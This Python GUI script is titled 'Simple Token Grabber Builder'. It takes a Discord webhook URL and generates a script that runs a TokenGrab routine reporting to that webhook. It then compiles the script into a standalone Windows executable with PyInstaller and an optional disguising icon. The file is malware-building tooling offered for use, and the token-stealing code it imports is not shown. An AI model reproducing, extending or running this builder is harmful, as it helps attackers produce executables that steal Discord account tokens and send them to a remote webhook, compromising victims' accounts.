import tkinter as tk
from tkinter import filedialog
from tkinter.messagebox import showerror, showwarning, showinfo
from PIL import Image, ImageTk
from subprocess import Popen, PIPE
import threading
import os

USE_ICON = False

def builder(webhook: str) ->bool:
    if 'https://discord.com/api/webhooks/' in webhook:
        showinfo('Message',f'Building {webhook}')
        with open('built.py', 'w', encoding='UTF-8') as f:
            f.write('from src import TokenGrab\n')
            f.write(f'TokenGrab("{webhook}").start()\n')
            return True
    else:
        showerror('Error', 'That is not a webhook link!')

    return False

def pack(path: str):
    if USE_ICON:
        print('Adding icon to exe file')
        p = Popen(f'pyinstaller --noconfirm --onefile --console --icon "{USE_ICON}"  "{path}"', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        print((p.stdout.read() + p.stderr.read()).decode())

    else:
        print('Exe file (no icon)')
        p = Popen(f'pyinstaller --noconfirm --onefile --console "{path}"', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        print((p.stdout.read() + p.stderr.read()).decode())

def main():
    global USE_ICON

    anim = None
    count = 0

    def t_webhook() -> None:
        t1 = threading.Thread(target=get_webhook, daemon= True)
        t1.start()

    def get_webhook() -> None:
        gif_label.grid(column= 1, row= 3)
        webhook = webhook_input.get()
        text1 = tk.Label(root, text= 'Building .py file. Please wait.', font=('Raleway',7))
        text1.grid(column= 1, row= 3)

        check =builder(webhook)

        if check:
            text1.config(text="Finished building .py file. Packing to exe..")
            button['state'] = tk.DISABLED
            webhook_input.grid_forget()
            file_path = (os.path.abspath(os.getcwd()) + '\\built.py')

            thread1 = threading.Thread(target= pack, args= (file_path,), daemon=True)
            thread1.start()
            thread1.join()

            text1.grid_forget()

            print('Completed packing to .exe')
            tk.Label(root, text= 'Finished', font=('Raleway',7)).grid(column= 1, row= 3)

            gif_label.grid_forget()

        else:
            text1.config(text="Unable to build .py file.")
            gif_label.grid_forget()

    def add_icon() -> None:
        global USE_ICON
        icon_path = filedialog.askopenfilename()
        USE_ICON = icon_path

    def animation(count: int) -> None:
        global anim
        im2 = im[count]

        gif_label.configure(image=im2)
        count += 1
        if count == frames:
            count = 0

        anim = root.after(50,lambda :animation(count))

    root = tk.Tk()
    root.iconbitmap('assets/icon.ico')
    root.title('Simple Token Grabber Builder')

    # GIF 
    file="assets/load.gif"
    info = Image.open(file)
    frames = info.n_frames  

    im = [tk.PhotoImage(file=file,format=f"gif -index {i}") for i in range(frames)]

    gif_label = tk.Label(root,image="")

    #gif_label.grid(column= 1, row= 3)
    #gif_label.grid_forget()
    # GIF END
     
    animation(count)

    canvas = tk.Canvas(root, width= 600, height=150) 
    canvas.grid(columnspan = 3)

    logo = Image.open('assets/logo.png')
    logo = ImageTk.PhotoImage(logo)
    logo_label = tk.Label(image=logo)
    logo_label.image = logo
    logo_label.grid(column=1,row=0)

    menubar = tk.Menu(root)
    options = tk.Menu(menubar, tearoff=False)
    options.add_command(label="Add Icon", command=add_icon)

    menubar.add_cascade(label="File", menu=options)
    root.config(menu=menubar)

    webhook_input = tk.Entry(root, width=35)
    webhook_input.grid(column=1, row=1)

    img = Image.open('assets/build.png')
    img_btn = ImageTk.PhotoImage(img)


    button = tk.Button(root, command=t_webhook,image= img_btn, borderwidth=0)
 

    button.grid(column=1, row=2, pady=30)

    root.mainloop()

if __name__ == '__main__':
    main()

